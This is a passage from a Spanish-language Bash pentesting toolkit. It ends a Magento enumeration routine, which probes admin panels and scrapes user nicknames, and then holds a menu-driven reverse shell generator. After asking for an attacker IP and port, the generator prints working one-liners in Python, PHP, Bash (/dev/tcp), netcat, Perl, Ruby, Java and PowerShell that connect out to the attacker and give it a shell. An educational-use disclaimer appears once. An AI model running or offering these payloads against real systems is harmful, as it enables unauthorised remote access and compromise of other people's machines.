            echo "$path: $status" >> "$result_dir/admin_panels.txt"
        done

        # Búsqueda de nombres de usuario en productos y comentarios
        curl -s "$target_url/index.php/review/product/list" | grep -oP '(?<=<span class="nickname">)[^<]+' > "$result_dir/user_nicknames.txt"

        # Escaneo con Magescan
        echo "Realizando escaneo con Magescan..."
        magescan scan:all "$target_url" > "$result_dir/magescan_results.txt"

        echo "Enumeración completa. Los resultados se han guardado en el directorio $result_dir"

        # Nota de seguridad
        echo "NOTA: Este script es solo para fines educativos y de prueba. Asegúrate de tener permiso explícito antes de usarlo en cualquier sitio web."
    }

#--------------------------------------------------------------------------------------

# Redireccionamiento de funciones del Apartado de Enumeración de Gestores de Contenido

#--------------------------------------------------------------------------------------

    if [ $option5 -eq 1 ]; then
        wordpress_enum
    elif [ $option5 -eq 2 ]; then
        joomla_enum
    elif [ $option5 -eq 3 ]; then
        drupal_enum
    elif [ $option5 -eq 4 ]; then
        magento_enum
    elif [ $option5 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}


#---------------------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------------------


#--------------------------------------------------------------------------------------

# Apartado de Reverse Shells

#--------------------------------------------------------------------------------------

function RevShells() {
    # Función para obtener input del usuario
    get_input() {
        local prompt=$1
        echo -en "${yellowColour}[+]${endColour}${greyColour} $prompt: ${endColour}"
        read $var_name
    }

    # Función para mostrar las reverse shells
    show_revshell() {
        local lang=$1
        local cmd=$2
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en $lang: \n${endColour}${yellowColour}\n$cmd${endColour}\n"
    }

    # Función principal de Reverse Shells
    rev_shells() {
        local options=(
            "Python" "PHP" "Bash" "NetCat" "Perl" "Ruby" "Java"
            "PowerShell" "Reverse Shell Cheat-Sheet"
        )

        while true; do
            echo -e "\n${yellowColour}[+]${endColour}${greyColour} Opciones disponibles:${endColour}"
            for i in "${!options[@]}"; do
                printf "${purpleColour}%2d)${endColour} ${greyColour}%-20s${endColour}" $((i + 1)) "${options[i]}"
                [ $((i % 2)) -eq 1 ] && echo
            done
            [ $((${#options[@]} % 2)) -eq 1 ] && echo

            get_input "Elige una opción" option

            case $option in
            1 | 2 | 3 | 4 | 5 | 6 | 7 | 8)
                get_input "IP del Atacante" ip_address
                get_input "Puerto para la Reverse Shell" port
                ;;
            esac

            case $option in
            1) show_revshell "Python" "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" ;;
            2) show_revshell "PHP" "php -r '\$sock=fsockopen(\"$ip_address\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
            3) show_revshell "Bash" "bash -i >& /dev/tcp/$ip_address/$port 0>&1" ;;
            4) show_revshell "NetCat" "nc -e /bin/sh $ip_address $port" ;;
            5) show_revshell "Perl" "perl -e 'use Socket;\$i=\"$ip_address\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
            6) show_revshell "Ruby" "ruby -rsocket -e'f=TCPSocket.open(\"$ip_address\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
            7) show_revshell "Java" "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip_address/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();" ;;
            8) show_revshell "PowerShell" "\$client = New-Object System.Net.Sockets.TCPClient('$ip_address',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" ;;
            9)
                get_input "IP del Atacante" ip_address
                get_input "Puerto para la Reverse Shell" port
                for i in {1..8}; do
                    case $i in
                    1) show_revshell "Python" "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" ;;
                    2) show_revshell "PHP" "php -r '\$sock=fsockopen(\"$ip_address\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
                    3) show_revshell "Bash" "bash -i >& /dev/tcp/$ip_address/$port 0>&1" ;;
                    4) show_revshell "NetCat" "nc -e /bin/sh $ip_address $port" ;;
                    5) show_revshell "Perl" "perl -e 'use Socket;\$i=\"$ip_address\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
                    6) show_revshell "Ruby" "ruby -rsocket -e'f=TCPSocket.open(\"$ip_address\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
                    7) show_revshell "Java" "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip_address/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();" ;;
                    8) show_revshell "PowerShell" "\$client = New-Object System.Net.Sockets.TCPClient('$ip_address',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" ;;
                    esac
                done
                ;;
            *) echo -e "\n${redColour}[!] Opción no válida. Intenta de nuevo.${endColour}" ;;
            esac
        done
    }

    # Ejecutar la función principal
    rev_shells
}

# Redireccionamiento de funciones del índice
#--------------------------------------------------------------------------------------

    if [ $option -eq 1 ]; then
        HostIndex
    elif [ $option -eq 2 ]; then
        PortServScan
    elif [ $option -eq 3 ]; then
        SubDomDiscovery
    elif [ $option -eq 4 ]; then
        ServiceEnum
    elif [ $option -eq 5 ]; then
        CMS-Enum
    elif [ $option -eq 6 ]; then
        RevShells
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi